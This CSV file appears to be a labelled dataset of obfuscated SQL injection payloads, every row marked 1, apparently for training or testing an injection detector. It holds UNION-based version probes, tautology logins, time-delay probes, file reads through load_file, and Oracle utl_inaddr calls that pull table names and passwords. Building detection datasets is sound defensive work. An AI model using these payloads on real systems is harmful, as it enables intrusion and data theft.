payload,label
" && & (seleCt 0x3) 
 lIKe   utL_INaddr.get_hOst_AddRESS
 ^(  /*(SeleCt (select (sELecT (sELeCT (SElecT (seLeCT (SELECT 5))))))).*/ (]  sElECt diStINCt` (/**/ TABlE_NAME  )[	 fROm /*;=AtU0*/ (  seLecT`dIstiNCt@`(  taBle_NAmE/ )  , rOwnum(aS LiMIt FROM	sYS.aLl_tAbLES  )  /wHEre	limIt +LiKE  2o2  ;)* - )
]  anD 'i'='i",1
" sELEcT * FrOm uSeRS whereId\! LIKe   '2' Or;@ @9B2  likE/ (SELEcT 0X0x1) UNIOn sElecT (SeLect 0O2o1),verSIOn  (    )  ~or FAlSe   OR   FALSe|and tRUeAnd TRue[ AND  '2f' NoT LIKe '6F(' &&\(SelecT (sEleCT (SelECt (sEleCt (SELECT 2))))) -- 1'9Zl2#",1
"@sELeCT *\frOm USers WhERe ID  lIke= 4X0B0o1 Or 1x1 OR False#""  (   UNion selEct&(seLeCt (SelEct (seLECt (seleCT 1)))),versiON  ( !  ) 
--	7N6M",1
 sELECT NAme froM sysCOluMNs[WheRe	ID  liKe    (  Select iD FROm SySOBjectS whERE nAME ! =   tAbLEnaMe'  )  or 0xccb lIke 0XCcc AnD TrUe--,1
"SeleCT * FRom UsERS WHere)id""= 1_+$+ OR (sELeCt (SElecT 1))  Like  6 OR false	-- 0x1TE",1
"1; _(_.lOad_file  (  chAr 
(=)0X2f,(SElEct 101),(seLeCT 0x9c),(sELeCt 93),0x11,0o0xA0,(seLeCT (SElEcT 0o0o215)),(seLEcT 115),0x0x73,0X4X71,0O0o220  
) ;/*./?J@>u,d6~'wp*/
),  . ) },(selEct 9),0O1,(SELECT (SeLecT 1));",1
"	SELeCt * fRoM USers wHERE]iD  =! '8' ||) oR /(sELeCt (sELEct;(sELect (SELect 1))))"" = |0X1}UNioN seLECT 6O0o1X2,VERSIOn  (  +And ""l""=""l""$Or (SELect 4) oR:""h	"" not LIKe oR 0X0 OR FALSE	or	FAlse Or FaLSe#""h	""# )   --)3O4'RG,P^C",1
":selecT}* froM UseRs WHere Id  = '0o1'  Or  \.<\ UnIoN-sElEcT 5x1,@@VERSIon or faLSe ;oR  0b8X0  &&  TRue aNd 'd'='D'~OR (seleCT (SELECT (SELECT (SELECT 7)))) or ""ZA	"" NoT likE ""zA	"" OR False -- 0'",1
"?+=OR>""0x0O0B1010/= 4x4%aNDTruE or '&'}liKe '&L';And[true>or fAlse ANd TRUE oR(FALse Or FalSe AND TRUE$OR FalsE&&tRUe AND TrUe<--",1
))=Or~|.:(._'a'	:=!/*0o2B0o0x6X0B0o6b111111101Ra!}}*/'A,1
"ADMIn' oR$0X1 !=*
(SElECT (selEct (sEleCt 1))) and 0x1eF IN;(0X1EE,(sElECT 0X0x7X1eF),(SElEct (seLEcT/*HaF0Y*/0b111120050))) && ""K""=""K"":aND`TRue oR FALse and trUe#lU",1
"{SeleCt	*`fRoM\USeRS;wHERe|iD =/*X'v/|)6;:*/ 0b2x8 oR "" =(+]""\ OR`""0X0x5X3  =[,0o0O0x0O2B9x0o30~Or ""G)""=NOT  -liKe;  ""g)""~&& ""re`"" not liKE ""rE`&oR 7X0O0*or FalSE oR False  &&  truE anD (SELECT (seLecT (SELECT 1)))#"" --}8o1fLvq&@D;7",1
OR;(SElect (sELeCt 0x0))	 liKE :(SeLeCT 0b0X7)|Or|'C' <> 'c' orfaLSE+aNd TRUE OR False --,1
"}anD 0x0o0B0o0o0b0b101010011010100001101100B9` < liKe   `Utl_InaddR.Get_HosT_AddREss  *( ;  (/*;>m{*/ 	SeleCt~distIncT  (  CoLuMn_naMe  ) <~From}+ (  SElEcT DisTincT  (/*UAbF_ZJG2""WDd*/ColUMN_NAme [)  , rOwnUM As liMit'fROm ALl_tAB_cOLUmNs%*)   WHerE LimItliKe (seLect[6x0b0b0X16c924)   )	   )($ aNd''I'  LIke ;'I",1
" sELeCT * FROM uSers WHERe iD  = )'2x2' %!<@  <oR ^fALSe*Or/*<*/FalSe }oR ""It""~notlIKe ""iT"" or|faLSe anD`TRuE Or '*SM' NOT LIKE '*SM' And tRUE AnD (sELECT (SELECT 0x1)) or faLse AND (SELECT 0x1) OR False#OR (SELECT (SELECT 0))#UNion
SEleCT_5X0o0o2x5,VersION^ (\'; )  {-- 9'm0B101vt0o0b11@ns",1
" sELEct * fROm{UsErS WHEre id  =+ 0X0x0x1 ||; ""&  ( ""  Or  0B0o0O4B101x8  liKE  (SeLeCt{0x1) or '2' != '2' OR=(SElect (seLeCT (sElect (SeLect (SELECT (SELECT (SELECT 0))))))) And TRue'Or False And
""^""\liKe ""^"" -- 0o0",1
" select * fRom uSers WhEre Id=0o4xA<Or ""?  ( 
""
or (SeLeCT (SElECt^0x9))
 Like  4b0O5 or fALse And (SELECT (SELECT 9)) and 'f' not  Like  'fB' or ""F9ba""=""f0o2BAs"" And 'Z' != 'zI' ANd tRUe -- (seLEct (selEct 0X0X9))]O\z[qrd?",1
DisTinCT,1
"sELECt *""frOM}usErs WHEre ID/*[Y;0b101?XqVm	lE*/= '0b101' * `(  \  )    oR  6X0O3 LIkE (SELeCt (SeLEct 1)) oR FaLSe or faLSe and tRUE  oR  'te'!='TE' -- 5'~JQ",1
"1 ANd aSciI  (  LoweR  (< sUbsTrInG/*wMHbn(:P!
6*/  (  (   sELECt toP (SELECT 1) NaME FroM SYSObjeCts wHERE XTYPE  liKE  'U'  )  , (SELECT 1), 1   )    )	    )   > 136",1
SELect`*/**/fROm	usErs wHerE_ID	  LiKe=  0B9b1~or \.<\ Or 5X0b0o1 liKe?8B1;OR faLSE OR FALsE	--+4K>I<0x1J,1
"adMIn"":or""""0X2B0b141001100""
=.""5B0b1010""--",1
" SelECt * fRom UserS WHeRe ID   lIke   (SelECt (SELECt (SELECT 0X8)))\OR ""%{"" OR_0X4x9B2+}= ""1X1}aND True  oR 
FaLSE anD)TrUe Or ""j2"" Not lIkE ""j0b10"" Or/""=I"" LIkE ""=Is"" oR ""=N5"" not LikE ""=n0X5"" oR+0Xe0D <> (SELeCT (SelEct (sElECt 3547))) OR "",%d""="",%dL"" oR (selecT!(seLEct 0x0)) oR ""H}f"" nOt LIKe ""H}f"" -- (seLEcT 0B131x0b1002)^!]'Uqgv'",1
"^sELect	* FrOm USers[whErE,ID{ Or FaLSe aND tRUE AND (SELECT 1) OR False#={`0X3 or((Select 1x9) and/*S*/'	v0B1001' nOT lIKe	'V0b1051M'#OR@FalSe	 &&/*!#(SELECT{(SelecT (SELecT (SeLEcT (SELECT 0)))))*/ 0X70cF<>0X10CE#""?;LiKE$0o0b0X1<|| 2X7 = +5x1?--""1X1m;?d*k]y",1
" SeleCt * FroM`useRs&WhEre Id  =/**/
(seLecT^1)|Or
""%?"" oR 0o6=(SELECT 1)?--	05",1
" AnD	(SeleCt (sElect (SELECT (SELECT (SELECT (SELECT (SELECT 1))))))) =  uTl_iNAdDr.gET_HOSt_AddrEsS   (    (=  SeLecT DiSTINCt  (  PaSswoRd  )   FROm   (  seLeCT dIstiNcT  (^ PaSswOrd  )  , roWnUm aS limit FRoM sYs.uSER$  )   wheRE lImiT/ lIKe* 0x0x8+  )   
)    aND 'i'='I",1
" sELecT * FrOm*usErs wHerE Id  ={ (selecT 0X6)	OR'""? /**/ && ` truE OR (SELECT 0) oR`FaLSe and tRUE AND 1838 NOT LIKE
(SELECT (SELECT 1849))#""_oR 0x8  =_[5X9*-- 6o4IJ=xP6@",1
"oR0O11X0X0O0O1
=!4x3b1`oR""""=",1
"/*|A|e</DXfY0O0o7U96Y~*/Or}(seLECT)0X2), ~=!*)0B0X0O0b7O4B18",1
" SElecT * FroM uSErs wheRE ID{ like ""(SELECT 0X3) OR "".&
(/**/.""]OR 0x0X6like!(SELecT (SelEcT (SELECT 1))) &&^""v""!=""vu"" aND TRUE oR '!'='!N' oR FAlse Or fAlSe ANd TrUe --]0X5o2Xre",1
" SeLect * FroM>UseRs wHEre^Id  lIKE  '7' unIon Select  OR /(SELeCt 8),veRSIoN 	(    )  /*Mk~yoL*/or (SeLeCT 0X0o0) Or fALSe  &&  ""qht)""=""qHT)"" OR (seLecT 0x13b1) NOT LIke (SElEct (selECT (SElECt 6046))) AnD tRuE anD TRuE --(9'x\BXK",1
"\select * frOM UserS WHere}oR FaLsE  OR ^False OR False#ID{ lIkE /'0b0o4'>UnIoN;SeLecT +\.,@@VErsIon   oR   (sELect 0o6)[--
3O0B0o8'&l",1
Or(sEleCT 7X1) LiKe	8x8/*,1
%(SelEcT 20)OR^4  lIke ;5,1
" selEct * FroM/*~;y*/USeRs!wheRe;Id LIKE (seleCt
(seleCt (SELECT 9))) <@&@ uNION SELeCt 0o7,VeRSIon  ()   )   anD!(SEleCT (seLect 1))< AnD  'd""O'='D""o' anD 1 or 9883 NoT LIkE 0x25d3 or false -- 0X0o1;?Qw",1
"=SELecT\*,fRom	uSERsWHeRE>Id~lIKE?'4'/*){N;aH2Dxed>*/uNion.sELecT{$*$,@@VERsIOn/* E.@jdf/lOjm8ZJq+] Z;kxa*/aND_TRUe$&&,trUe<--0x0b0O0b1010o2O0o7'`.7B1271",1
"1;}/*g5TdXMZ [  oR    0b0#u*/(  Load_fIle<<(!cHAr ( ;8x2f,(sEleCT 8B1100101),0O0XA1,90,0X2f,(SELECT 118),0o0X0B0b11011000111111101,(selEcT:0b1111310100),/**/...]Jq",1
" seLect *?FRoM$UsErS WHerE iD  LiKE *'0o0b1'~or+$ (sELect (SELECT 1))  =_ 0x0x9=UNIon selEcT (seleCt`(SelECT@1)),@@versIon  OR  0O0x0/*4hxTNF?TYZ*/ Or %(selecT (SeLect (SELECT 3004)))? LIke  (selecT 0xbD0x5O3)  or  false? Or  FalSe or ""[]""not = ""[]"" OR False -- 9o2'S #l~5f",1
"select * fROM usErs WhERe Id Like 0x1x1 or
\.<0B1 oR (sEleCt (sElECT (SELECT 4))) = (SELECT 1) -- 0X1 {x",1
"-SelEct/* t(4VS9LIZ]'{ S*/* FroM uSErS whERe ID	=('4o0O0x1'-or \<\-UNion SeLeCt (SElECT.(sELECT (SelEcT (sElECt (SELeCT 3))))),@@VERSioN
&& TRUe{  oR\  (Select 0x0) )Or  'E' NoT = 'E' oR fALSe OR (selecT 0) aND 1 OR False -- 4'JH:gj",1
" SeleCT *#frOM uSeRs WhERe iD {=`|(sELEcT 1) UNiON selECT (SELECt (sElect 0o2)) OR 0b1,vErSiON>(    )   ---0i=",1
" Select * fRoM uSERS wHeREId  =  (select (SEleCt 5))  || 1 unIOn SEleCt&NuLL,BanNer from v$VErSion whErE ROWNuM  =  (select (SeLEcT 1)) -- (SELECT 3)/k",1
"SELect * fROm UseRS WHeRe iD  = 
'5' or \.<\   Or   1X8  =  (seLeCT (SELEct 3x0x0X1)) anD "" "" <>^""	{"" AnD%TRUE Or 'O'='oR' OR FAlSe Or ""D""<>""D"" Or (SElEct (sElEcT (sElecT (SELECT 0))))  AND  TRue oR fALSE oR fAlse -- 2'Sb2Vuj",1
" sElect * FroMuSerS`wHeRE*Id=(seLect 1) oR ""]{"" Or (sELEcT 0x4) /lIke  (SElECt (SeleCt 1)) OR 0x47B NoT lIKE 0X4A6)or faLSE ANd (sElECt 9486) NOt lIKe`1627 anD trUE or 0 --\0b8X1",1
" selEct * fROm USeRS:WHERE Id  LiKe  (seLeCt (sElECt (SelECt""1))) Or "".@"" or (SELECT 5)  =  0x1[ or  FALse oR '2Z&' nOt='2z&' -- 0O1",1
" select *-fRom UsErS WHerE/**/Id  likE (sElEct (seLecT (SELECT 1)))-Or	""$["" Or:0B0b0x1  liKe  (SelEct (SelEcT (seLECT 0x0)))`anD True]Or 6X169 != 0X1af&&truE anD TrUE || (SELECT 0) --}0X1E!",1
"Or`9X6x0B3o0b10010000_{ANd}}""J~/""@nOT&liKe~""j~/P""^--'",1
" SELeCT * FRoM USeRS wHeRE Id=?0b3 oR "",;"" oR 1}=  0
or faLSe OR False -- 1=c",1
"admIn""	oR-0x0o1?=?(sELECT?0o1)#",1
" sELeCt * From uSErs wHeRe iD  LIKE  (SeleCT (SElEcT (SelecT-0x1))) +  (  0x3  )   UnIOn SEleCt|null,bANNER from V$vErsIoN wHere ROwNum  =/*MO*/ (SelEct 0x0) -- 0O5o4o10`t",1
\X0o20UnIONsElect,1
PrinT,1
" sElecT * FroM userS wherE	id =	'2' uNIon
SElECt   (  \.^) ~,@@veRSion AnD)tRuE ; AND  truE OR 0x5B NOT=(SelECt (SeLECt 0o63))  &&  TruE -- 6X0B201'hjgIi`v:",1
"or?(SELECT (SELECT 6))
=}0x0x7--",1
"9B1/*B5u1\<*Kw^x09*/	OR-[pg_SlEep
}([__time__(_)$'!oR(\7b0b1010x9b0b0O0o0b0b8O1x19CX0)--",1
" SelEct */**/FrOm useRs WHERe id %LiKe  (SeleCt (SELecT](sElECT 0O1)))  OR  "",  or  0x0 AnD (seleCT (SELECT (SELECT 1)))   aND   tRuE OR fAlSe#""oR
0o1  lIke  0b4X0O0B0 -- 2Z:nA 8",1
"aDMiN'?@)
-/or@_-(/""'0X2x4'{/*C,0b0o9x1o0xBo0X8qB|RzX0x2Y0X0b0b1051.akYx0B0B110l`Z@J~ke	iB0B0O144h|rTM7I0}P5hq"";3?rKC*/	
+=+>`
`'3x3X0o1B0b134'/*",1
Or (SeLEcT0X2) BEtwEEn	4x7=AND+4,1
"!seLeCT * froM usERsWhERE Id lIKe 1Or ""	 )+?.""  LIkE) (SEleCt#(SELECT 1)) oR 0B0x8=0b0b12  Or  (seleCt (SelECT 0)) AnD TrUE -- 1m",1
" SELECT{*?frOM uSERs WherE Id:= 0o8 or 0o0x8X0B83X0x2]  &&   ""Zt""""  noT LIkE  ""zT""}""  and  9X16Cb NoT LiKe (SelEcT 0X96Cc) or)falSe Or FAlsE oR (SeLECT (SELECT 0)) and (SeleCT 0o1) or FaLSe#"".;uNion`sEleCt
null,veRsion *(;   )  +-- 0X0xf2CfKa Ix ",1
"admIn';or
'0O0o0o6'
=;'6",1
" sElECt * fRom USerS
WHERE/**/Id  Like  0X9 UNiON select 1,bANnER FROM v$vErsion WHerE RoWnum  LIkE  (SELECT 1) oR FAlse or falSe  OR  FALSE -- 1RE",1
"""/*HZ(;:0b101005GYpE&*/oR	9o19=[9X0x0b0X0*or=FAlsE+^=or . 0O0X195""NOt$LIKe&0X194#--9g",1
"(SELeCT*	fRoM(uSerSwHERe'ID=0O0o6 UniON}sELECT/**/@`$_,VeRsIoN*(. ; )+<_OR	'7'='7o7b7X6X0o1762C'{Or$FaLsE	--}0xbgnx5?]",1
"SELEct * froM UsErs`wheRe id/*:*/=
5o8	<@.$ or
8 =`(selEcT 1)  or  FaLse oR^FALsE -- (sELect 0x1) `{P",1
" SELEct * FroM UseRS whERE	id =""0X0O0X0b1021 oR ""%."" Or 0x0O1 _=  (sEleCT (SelEct>(SeLeCt 1)))oR faLSe -- (seLECT 7X0B10)+9t",1
"/*	X9**/select * FRom USErs_wHeRE ID = 0X0b1+$+*$ uNioN SeLecT NULL,@@VErSIoN Or fAlse Or 0x0OR (seLEct (seLECT (SeleCT 9105)))=0X23BE oR FALsE  aND  (sELeCT (SelECt 1)) Or FAlSE --`0i",1
" selEcT * FROm<USerS wHEReid ;=  (SELeCT
(SElECt 1)); OR  "",."" or 0x0o1/**/LIkE  1 -- 4m",1
chAr%0x4O4583%0o0x85%9B%0x83seLeCT,1
" SEleCt * fROM USerS<wHEre iD ;=
 0O0X3Or ""1&"" OR*(seLECt 0)+  &&  1 && (sELeCt 1)Or fALSE#likE  (SeLeCt (SeLEcT 0O1))  AND  ""M"" NoT/*
3o:j*/lIke ""m"""" anD}945|NotlIKE0O0X6b2 And TruE|AND ""`""  not LIkE  ""`b"" And tRUE{ OR  (seLECt (Select 6X9)):&& ""ujoR""{nOT LIke ""UJor]"":OR 7980 NoT lIkE 0X1F36 OR 7 oR FaLSe;-- 0#oy<jJ",1
"AdmIN':\))>\Or<[](*'5B1000x0B7x0B0o1051'{=
'0b110B2b10o1",1
"dEclare[@S/*0x216*/VaRcHAR 	`( $(SeLECt 0B2X0x0B111D909a3)`&)	 SelECt @s> ;LikE	,-2O0O0o0X0b10010101101110000C6<...",1
"||/*+	L(0x5i[g*/9X6o0	'={'4X0B0-#""0n3i`(sELEct?(selECT (SeLEct+(seLeCt (SELEcT (SELECT 1))))))</'^",1
" sElECT * FRoM|uSErS WheRe Id  Like	 0x1
or "".]""/**/oR 0b1=(SElect (SeLect 6))+AND (seLect (sELEct(SELEct 0x1))) -- 0AiG",1
"^),~&	Or/*px*NrE1o0b1001b0o0o0o6$3AF)W^:=}JCOa3:^oc*/ $@(}~&&+.'x'
~liKe.['x",1
" seLeCt * froM UsERs wHErE ID  LIKE ;0x3X1.<@$ UniOnseLect (sELECT)(SELECT (SELECT 6x5))),VersION  (  /**/ )  aNd '['='['(oR{fAlse OR fAlSe or 0b1001x0;-- 0B1|8:",1
$	&(+/*p)|*/slEEP(SelEct`0X0O0b0B3300170X25)	!)<,1
" SElEct_* fRoM usErs WHerE ID!='6O5 *0X1 UNIONselEcT nuLL,bANneR FroM V$VerSION wheRe rowNUm  LiKe- (sELeCt 0O1) oR_""@"" NoT lIke""@"" oR (SEleCT 4o0) aND TruE : OR!  ""Bpy"" nOt lIKE ""bpy""anD True oR (SELECT (SELECT 4002))!=0XFA0o2 aNd ""EdJ""!=""edJR"" OR falsE Or FALSe OR 0x0 -- 8bY)",1
"1/*)Vrpr3NPK*/unIon AlLsELEct (SeLEct 0o1),(sElEcT}(select 2)),0x3,(SELeCt1),(SEleCt
0b851),0X2,NAME FRom sySObjeCtsWhEre`xTYpE ?likE And truE Or '&M('='&M(6' aND+TrUe;Or (SeLect (seLEcT 0)) ANd tRUe or<falsE oR FaLSE and 1 And trUe#  'U'  OR  0x1O0O0b0b0'--0X9ENlbnh@%:",1
" sELecT * fROM uSErs whErE;id  LiKE  4 oR (SEleCt 2X4)[&& (SELECT 1) oR falSe#"". uNiOn SElect 'A',VeRsIoN  (=   )   -- 0",1
" sELECT * FrOM USErs whErE iD   LIkE  ;0o0o10X3 oR (SELECT 8) Or fALSe OR&(SELECT 0) OR False#"";	UnIoN select NULL,VERSIoN  (    )   --/**/3B%[p""}<",1
"=seLEcT * fRom usErS WheRe iD &=  3 oR (seLeCt	(SElEct (sElect (SELECT (SELECT 1)))))  ||  '~3'  NOt like  '~5'  OR  FAlSe OR FalSe oR FAlSE  oR  fAlSe#""?@Or@4X1+ LiKe  0o11X2 -- 0x1^<",1
"""a""""
,;) oR^ ;<$8X6x3~=
](seLeCt,0o0X0O4x6)--""",1
"$SEleCt *FrOm USErS wHEReID$ =  7 *(sELeCt 0x5) uNIOn seLEct (SELECT 1),bANner froM V$VerSIOn wHeRE RownUm  =` 6 OR ""3""=""4)"" AND ""Y>""<>""Y>H"" OR False --$0O1",1
"  &&  0B0B0O0B110x0X2b2x0X5b0b100010110100101110111  liKe utl_iNaddR.GeT_Host_aDdrEsS/*BM*/& (]/*5JTph_K*/ )(  ?select%DiSTinCt 
(  colUmn_nAMe 
)+
fROm   ( +sElECT DIsTiNcT?-( [cOLUmN_NaMe +) 
, ROWnuM aS:lImIt froM!ALl_taB_ColumnS? ) ?(WHere lIMIT lIkE 0b0o145x0x9o0X0o0O0x5~ `):/**/ )|> and'i'<LiKe 'i",1
" sELECt * FRom uSeRs WhERe iD""= '0' UniON SelEct   ( ;\  ) ?,@@VErSion    OR + ""_""=""_q"" oR FaLsE  OR  False  &&  ""Bfvsi""<>""Bfvsim"" --	0o4')Z",1
"0B2B7O0o0b81B100 ANd&uSEr_name
`(,   )
/*(`(*/  [= 
 'dbO'",1
"; If noT  (  sUbSTring   (    (   seLEct @@VERsion/**/ )  ,0O0B100101,(SelECT 4)
)    <>  (selecT 0x1)?=)   WAITfor DeLAy '5:(SELECT 0):2' aND true   AND   1310<>(SELECT (SELECT 1311)) --",1
" sELECT *'fROM uSeRS	wHere iD  LiKE  0X1X6oR (SeLEct 0X1)  aNd: 0x3b0 nOt LikE (selecT
(Select (sEleCt (SeLeCT (SelEcT (sELeCT (sELEcT 781))))))) And tRue aNd ""m""!=""m,"" aND tRUE/**/And 9x1 anD (SELECt 1) Or 'Q '!='Q ' Or fAlSE#""$UNIoN/*&kE.]*RI`*/sELecT (SElEcT (SeLecT 0x0X2)),verSIon  (    ) [:-- 3Prx",1
" SeLecT * FroMUSErS wHERE!ID lIkE
(SElect (SelECt 0X0)) oR 0x1 and (SELECt (SELECT (SELECT 1)))#""{~uNioN SeleCT NuLl,vErsIoN
 ( + ,)/**/  --/**/0x4uzS",1
seLeCt * FroMUsErS wHere iD   =   '2'[*$ ./*yB>e)(SELECT 0)`EnV'XX&*/OR (select (SelecT (sElect 1)))  liKe *(SeleCt 1x1)^-- 0X0b1'2@fw,1
"SelEct * frOm UseRs/**/WHere ID\  LIkE ; 0X0B1 +$+.
or (seleCT$(SELECt 6)) =	0O1 OR FALSe AnD 5055 nOT LIke 5056 oR FalsE -- 1]",1
"sELect=* from UsErS<wHErE iD"" like ](SELEct 0X3)  oR|   (  \+  )   =  (seLeCt (SElect 0X1)) Or](SelECT (SElECT 6))  lIKE &(SelEcT 0x6)   OR   ""="" lIkE ""=5o14"" and (sELeCT 2))-- 0O4GrMECBA",1
